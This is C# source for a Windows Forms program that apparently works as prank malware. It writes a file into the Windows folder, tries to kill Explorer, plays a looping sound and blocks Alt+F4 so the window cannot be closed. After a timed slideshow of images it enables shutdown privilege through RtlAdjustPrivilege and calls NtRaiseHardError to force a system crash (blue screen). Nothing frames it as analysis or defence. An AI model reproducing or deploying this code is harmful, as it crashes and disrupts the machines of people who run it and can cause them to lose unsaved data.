using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;
using System.Diagnostics;
using System.Security.AccessControl;
using System.Security.Principal;
using Microsoft.Win32;
using System.Runtime.InteropServices;
using System.Media;

namespace Orocess
{
    public partial class deep : Form
    {
        [DllImport("user32.dll")]
        private static extern bool SetCursorPos(int x, int y);

        [DllImport("ntdll.dll")]
        private static extern uint NtRaiseHardError(int ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, out uint Response);

        [DllImport("ntdll.dll")]
        private static extern uint RtlAdjustPrivilege(int Privilege, bool bEnablePrivilege, bool IsThreadPrivilege, out bool PreviousValue);

        public deep()
        {
            InitializeComponent();
            //cursor.cur
            string originalFilePath = Path.GetTempFileName();
            string windowsFolderPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Windows), "cursor.cur");
            byte[] bin1 = Properties.Resources.cursor;
            using (FileStream fs = new FileStream(windowsFolderPath, FileMode.Create))
                fs.Write(bin1, 0, bin1.Length);
                
            System.Diagnostics.Process[] ps =
    System.Diagnostics.Process.GetProcessesByName("explorer.exe");
            foreach (System.Diagnostics.Process pass in ps)
            {
                pass.Kill();
            }

            SoundPlayer player = new SoundPlayer(Properties.Resources.w);
            player.Load();
            player.PlayLooping();

            img1.Interval = 3000; //コマ
            img1.Enabled = true;
        }

        protected override void WndProc(ref Message m)
        {
            const int WM_SYSKEYDOWN = 0x0104;
            const int VK_F4 = 0x73;

            // ウィンドウを閉じない
            if (m.Msg == WM_SYSKEYDOWN && m.WParam.ToInt32() == VK_F4)
            {
                // ALT+F4に対する処理を行わない
                m.Result = IntPtr.Zero;
            }
            else
            {
                base.WndProc(ref m);
            }
        }

        private void pictureBox2_Click(object sender, EventArgs e)
        {

        }

        private void deep_Load_1(object sender, EventArgs e)
        {
            //フォームを画面の中央に配置
            this.SetBounds((Screen.PrimaryScreen.Bounds.Width - this.Width) / 2,
                (Screen.PrimaryScreen.Bounds.Height - this.Height) / 2, this.Width,
                this.Height);
        }

        private void img1_Tick(object sender, EventArgs e)
        {
            pictureBox2.Image = Properties.Resources.img1;

            img1.Enabled = false;

            img2.Interval = 3000; //コマ
            img2.Enabled = true;
        }

        private void img2_Tick(object sender, EventArgs e)
        {
            pictureBox2.Image = Properties.Resources.img2;

            img2.Enabled = false;

            img3.Interval = 3000; //コマ
            img3.Enabled = true;
        }

        private void img3_Tick(object sender, EventArgs e)
        {
            pictureBox2.Image = Properties.Resources.img3;

            img3.Enabled = false;

            img4.Interval = 3000; //コマ
            img4.Enabled = true;
        }

        private void img4_Tick(object sender, EventArgs e)
        {
            pictureBox2.Image = Properties.Resources.img4;

            img4.Enabled = false;

            img5.Interval = 3000; //コマ
            img5.Enabled = true;
        }

        private void img5_Tick(object sender, EventArgs e)
        {
            pictureBox2.Image = Properties.Resources.pii1;

            msgbox randam = new msgbox();
            randam.Show();

            img5.Enabled = false;

            var i = 0xC0000022;
            bool t1;
            uint t2;
            RtlAdjustPrivilege(19, true, false, out t1);
            NtRaiseHardError((int)i, 0, 0, IntPtr.Zero, 6, out t2);
        }

        private void end_Tick(object sender, EventArgs e)
        {
        }
    }
}
